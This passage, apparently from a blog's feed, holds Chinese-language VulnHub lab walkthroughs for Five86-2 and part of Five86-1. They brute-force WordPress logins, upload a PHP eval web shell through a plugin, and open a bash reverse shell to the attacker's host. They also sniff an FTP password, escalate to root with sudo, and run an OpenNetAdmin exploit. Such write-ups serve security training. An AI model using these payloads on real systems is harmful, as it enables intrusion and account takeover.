alt="image-20240113210841008"></p><p>我们可以看到有wordpress框架，看来是需要爆破的</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>感觉页面好像不对劲，显示也有点问题</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113210939830.png" alt="image-20240113210939830"></p><p>点击其他链接的时候，会跳转到一个域名，但是无法访问，一般出现这个情况，应该是要设置本地的hosts文件，加上192.168.52.133  five86-2 即可，kali修改&#x2F;etc&#x2F;hosts文件即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211209004.png" alt="image-20240113211209004"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211231658.png" alt="image-20240113211231658"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211253423.png" alt="image-20240113211253423"></p><p>现在可以看到页面显示正常了</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211447685.png" alt="image-20240113211447685"></p><p>看来是wordpress，我们需要爆破用户名和密码</p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.133<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113211945590.png" alt="image-20240113211945590"></p><p>我们访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.133/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212042983.png" alt="image-20240113212042983"></p><p>wordpress的登录页面</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.133 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212247939.png" alt="image-20240113212247939"></p><p>只有wp-login.php是有用的，所以接下来我们进行爆破用户名和密码</p><h3 id="3-登录wordpress"><a href="#3-登录wordpress" class="headerlink" title="(3)登录wordpress"></a>(3)登录wordpress</h3><h4 id="1-爆破用户名"><a href="#1-爆破用户名" class="headerlink" title="1)爆破用户名"></a>1)爆破用户名</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Wpscan一些常用语句：wpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxxxwpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx --enumerate t 扫描主题wpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx --enumerate p 扫描插件wpscan --url http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>xxx --enumerate u 枚举用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://five86-2 <span class="token parameter variable">--enumerate</span> u <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212829410.png" alt="image-20240113212829410"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113212901529.png" alt="image-20240113212901529"></p><p>爆破出来5个用户名</p><p>接下来我们制作字典</p><h4 id="2-制作字典"><a href="#2-制作字典" class="headerlink" title="2)制作字典"></a>2)制作字典</h4><p>把用户名写到一个文本中，用来暴破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113213738684.png" alt="image-20240113213738684"></p><p>由于 kali 自带的字典太大了，这里导出前 3 万行用来当字典</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;usr&#x2F;share&#x2F;wordlistshead -30000 rockyou.txt &gt; MS02423.txtrockyou.txt.gz第一次是一个压缩包，需要我们进行解压gzip -c -d rockyou.txt.gz &gt; rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113214810520.png" alt="image-20240113214810520"></p><p>使用 wpscan 暴破，得到两个账户的信息，-U 为暴破用户名的字典，-P 为暴破密码的字典(由于字典比较大，所以爆破时间比较长)我这里爆破了40分钟</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.52.133 <span class="token parameter variable">-U</span> /root/users.txt  <span class="token parameter variable">-P</span> MS02423.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113214858239.png" alt="image-20240113214858239"></p><p>得到两个账户的信息<br> barney&#x2F;spooky1，stephen&#x2F;apollo1</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240113230720023.png" alt="image-20240113230720023"></p><h4 id="3-登录"><a href="#3-登录" class="headerlink" title="3)登录"></a>3)登录</h4><p>我们登录 barney&#x2F;spooky1，可以发现3个插件我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114201635955.png" alt="image-20240114201635955"></p><p>第三个插件，大概意思是我们可以插入内容，这里我们使用一句话木马即可</p><p>在谷歌上搜索一下，不难搜到这个插件的RCE：WordPress插件IEAC漏洞分析及组合利用尝试，在exploit-db上也有</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">先生成poc.zip，<span class="token builtin class-name">echo</span> <span class="token string">"hello"</span> <span class="token operator">></span> index.html<span class="token builtin class-name">echo</span> <span class="token string">""</span> <span class="token operator">></span> index.php<span class="token function">zip</span> poc.zip index.html index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114201931528.png" alt="image-20240114201931528"></p><p>这个我们先放一放，我们查看另一个用户</p><p>stephen&#x2F;apollo1</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114202159521.png" alt="image-20240114202159521"></p><p>我们可以看到没有任何东西，那么我们就可以一句话木马</p><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="(4)漏洞利用"></a>(4)漏洞利用</h3><h4 id="1-制作一句话木马"><a href="#1-制作一句话木马" class="headerlink" title="1)制作一句话木马"></a>1)制作一句话木马</h4><p>先创建一个文件夹，在文件夹里创建php和html文件,php文件里写入一句话，html随便写，只要能看到内容就可以</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> MS02423<span class="token function">vim</span> <span class="token number">1</span>.php<span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'MS02423'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span class="token comment"># php文件</span><span class="token function">vim</span> <span class="token number">1</span>.html<span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>></span>test<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>></span><span class="token function">zip</span> <span class="token parameter variable">-r</span> MS02423.zip <span class="token number">1</span>.php <span class="token number">1</span>.html<span class="token comment"># html文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204105677.png" alt="image-20240114204105677"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204139513.png" alt="image-20240114204139513"></p><p>在Posts—&gt;Add New，点击＋号，选择e-Learing，点击UPLOAD</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204905184.png" alt="image-20240114204905184"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204526530.png" alt="image-20240114204526530"></p><p>点击CHOOSE YOUR ZIP FILE选择上传的压缩包，然后点击旁边的UPLOAD</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204540741.png" alt="image-20240114204540741"></p><p>然后访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.133&#x2F;wp-content&#x2F;uploads&#x2F;articulate_uploads&#x2F;MS02423&#x2F;1.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 访问到上传文件夹里的html文件即可，url中的MS02423是上传文件夹的名称</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114204644417.png" alt="image-20240114204644417"></p><h4 id="2-连接蚁剑"><a href="#2-连接蚁剑" class="headerlink" title="2)连接蚁剑"></a>2)连接蚁剑</h4><p>然后使用蚁剑连接文件夹中的1.php文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.133/wp-content/uploads/articulate_uploads/MS02423/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114205423286.png" alt="image-20240114205423286"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114205447352.png" alt="image-20240114205447352"></p><p>我们可以看到连接成功</p><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h4><p>kali监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210159296.png" alt="image-20240114210159296"></p><p>我们修改1.php内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'MS02423'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'bash -i >&amp; /dev/tcp/192.168.52.152/666666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210039405.png" alt="image-20240114210039405"></p><p>我们访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.52.133/wp-content/uploads/articulate_uploads/MS02423/1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到反弹成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210130063.png" alt="image-20240114210130063"></p><p>获取交互式shell，这里python不行会报错，需要python3</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210657326.png" alt="image-20240114210657326"> </p><p>执行sudo -l时提示需要密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114210722236.png" alt="image-20240114210722236"></p><p>看了一圈也没什么有用的，很多命令没权限，切换到stephen账户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114211015195.png" alt="image-20240114211015195"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114211227887.png" alt="image-20240114211227887"></p><h4 id="4-查看ftp服务"><a href="#4-查看ftp服务" class="headerlink" title="4)查看ftp服务"></a>4)查看ftp服务</h4><p>还是没什么东西，扫描的时候还发现了ftp服务，发现有ftp的进程，属paul用户</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114212236702.png" alt="image-20240114212236702"></p><p>ftp是明文传输，进程执行的脚本文件看执行命令应该是个定时任务，尝试抓下包,要确定抓哪个网卡的流量，查看下网卡信息，ifconfig这里用不了，可以用ip add,veth是虚拟网卡，br可能是桥接网卡，veth的master是br，类似冗余链路，这里就抓master网卡，也就是br网卡</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114212345906.png" alt="image-20240114212345906"></p><p>用tcpdump抓br网卡的包<br> -D查看可监听网卡，timeout抓包时间，-w生成文件，-i网卡，-r读取pcap包<br> (如果一直抓不到包的话，可以重启下靶机)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcpdump <span class="token parameter variable">-D</span><span class="token function">timeout</span> <span class="token number">120</span> tcpdump <span class="token parameter variable">-w</span> MS02423.pcap <span class="token parameter variable">-i</span> br-eca3858d86bftcpdump <span class="token parameter variable">-r</span> MS02423.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114213213377.png" alt="image-20240114213213377"></p><p>把包的内容复制出来，发现有PASS字段，搜索PASS，发现密码esomepasswford</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114213407806.png" alt="image-20240114213407806"></p><h3 id="5-提升权限"><a href="#5-提升权限" class="headerlink" title="(5)提升权限"></a>(5)提升权限</h3><p>我们登录paul用户，使用命令sudo -l</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114214511349.png" alt="image-20240114214511349"></p><p>发现可以免密执行peter用户的service命令</p><p>通过service命令进行提权，获取到peter用户权限， 直接&#x2F;bin&#x2F;bash会报错，不知道具体的路径，使用相对路径</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> peter <span class="token function">service</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114214830549.png" alt="image-20240114214830549"></p><p>再次sudo -l发现可以免密执行root的passwd命令<br> 更改root账户的密码后，登录到root账户</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> root <span class="token function">passwd</span> rootMS02423<span class="token function">su</span> rootMS02423<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114215115196.png" alt="image-20240114215115196"></p><p>我们切换到root目录下，即可看到flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240114215252628.png" alt="image-20240114215252628"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.wpscan工具的使用</p><p>10.蚁剑的使用</p><p>11.ftp服务</p><p>12.kali自带字典</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Five86-1</title>
    <link href="http://ms02423.top/2024/01/10/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-1/"/>
    <id>http://ms02423.top/2024/01/10/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BFive86-1/</id>
    <published>2024-01-10T08:22:14.000Z</published>
    <updated>2024-01-13T09:39:42.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Five86-1 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>five86-1<span class="token punctuation">,</span><span class="token number">417</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110164851637.png" alt="image-20240110164851637"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110164800256.png" alt="image-20240110164800256"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110165223225.png" alt="image-20240110165223225"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110165420001.png" alt="image-20240110165420001"></p><p>靶场真实ip地址为192.168.52.132</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110165739019.png" alt="image-20240110165739019"></p><pre class="line-numbers language-none"><code class="language-none">发现开启了22端口， OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)发现开启了80端口，Apache httpd 2.4.38 ((Debian))发现开启了10000端口，MiniServ 1.920 (Webmin httpd)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>MiniServ服务我是第一次见，百度一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205153717.png" alt="image-20240110205153717"></p><p>也可以使用masscan进行探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110170020295.png" alt="image-20240110170020295"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110170415130.png" alt="image-20240110170415130"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110203640342.png" alt="image-20240110203640342"></p><p>没有任何东西</p><p>还有一个10000端口，我们进行访问<a href="http://192.168.52.132:10000/">http://192.168.52.132:10000</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210030984.png" alt="image-20240110210030984"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210041105.png" alt="image-20240110210041105"></p><p>访问发现了登录界面，但是这里初步尝试了SQL注入漏洞，失败了。这里使用暴力破解难度还是很大的，并且极其花费时间且需要一个足够强大的字典文件，果断放弃爆破，继续收集有用信息</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204120425.png" alt="image-20240110204120425"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.132<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204525706.png" alt="image-20240110204525706"></p><p>我们扫描到一个robots.txt文件，我们进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.132/robots.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看到一个&#x2F;noa</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204401574.png" alt="image-20240110204401574"></p><p>我们进行访问<a href="http://192.168.52.132/noa/,%E4%B9%8B%E5%89%8D%E4%B8%80%E7%9B%B4%E9%83%BD%E6%B2%A1%E9%81%87%E5%88%B0%E8%BF%87%E8%BF%99%E7%A7%8D%E9%A1%B5%E9%9D%A2%EF%BC%8C%E7%99%BE%E5%BA%A6%E6%9F%A5%E8%AF%A2%E4%B8%80%E4%B8%8Bopennetadmin">http://192.168.52.132/noa/,之前一直都没遇到过这种页面，百度查询一下opennetadmin</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110204432319.png" alt="image-20240110204432319"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205527550.png" alt="image-20240110205527550"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205541731.png" alt="image-20240110205541731"></p><p>查看一下版本信息，发现是18.1.1版本</p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.132 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110205859600.png" alt="image-20240110205859600"></p><p>没有如何新的信息</p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="(3)漏洞利用"></a>(3)漏洞利用</h3><h4 id="1-搜索漏洞"><a href="#1-搜索漏洞" class="headerlink" title="1)搜索漏洞"></a>1)搜索漏洞</h4><p>打开漏洞库<a href="https://www.exploit-db.com/%EF%BC%8C%E6%90%9C%E7%B4%A2%E6%9C%89%E6%97%A0%E8%AF%A5%E8%BD%AF%E4%BB%B6%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6">https://www.exploit-db.com/，搜索有无该软件对应版本的漏洞利用文件</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210345265.png" alt="image-20240110210345265"></p><p>成功搜索到2个对应版本漏洞利用文件</p><h4 id="2-kali搜索漏洞"><a href="#2-kali搜索漏洞" class="headerlink" title="2)kali搜索漏洞"></a>2)kali搜索漏洞</h4><p> 在kali里面查询有无该版本的漏洞利用文件，如果有的话，直接就可利用</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110210838654.png" alt="image-20240110210838654"></p><p>找到了，并且RCE也对应上了,进入该目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/share/exploitdb/exploits/php/webapps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 然后执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./47691.sh http://192.168.52.132/ona/login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110212306274.png" alt="image-20240110212306274"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110212330406.png" alt="image-20240110212330406"></p><p>我们可以看到攻击成功了，这里我们还可以使用另一个方法msfconsole进行攻击</p><h4 id="3-msfconsole进行攻击"><a href="#3-msfconsole进行攻击" class="headerlink" title="3)msfconsole进行攻击"></a>3)msfconsole进行攻击</h4><p>我们进行漏洞搜索</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search opennetadmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220224839.png" alt="image-20240110220224839"></p><p>直接输入漏洞利用文件路径进行使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220249481.png" alt="image-20240110220249481"></p><p>查看需要配置那些参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240110220328080.png" alt="image-20240110220328080"></p><p>设置对应参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.52.132  （目标靶机IP地址）<span class="token builtin class-name">set</span> LHOST <span class="token 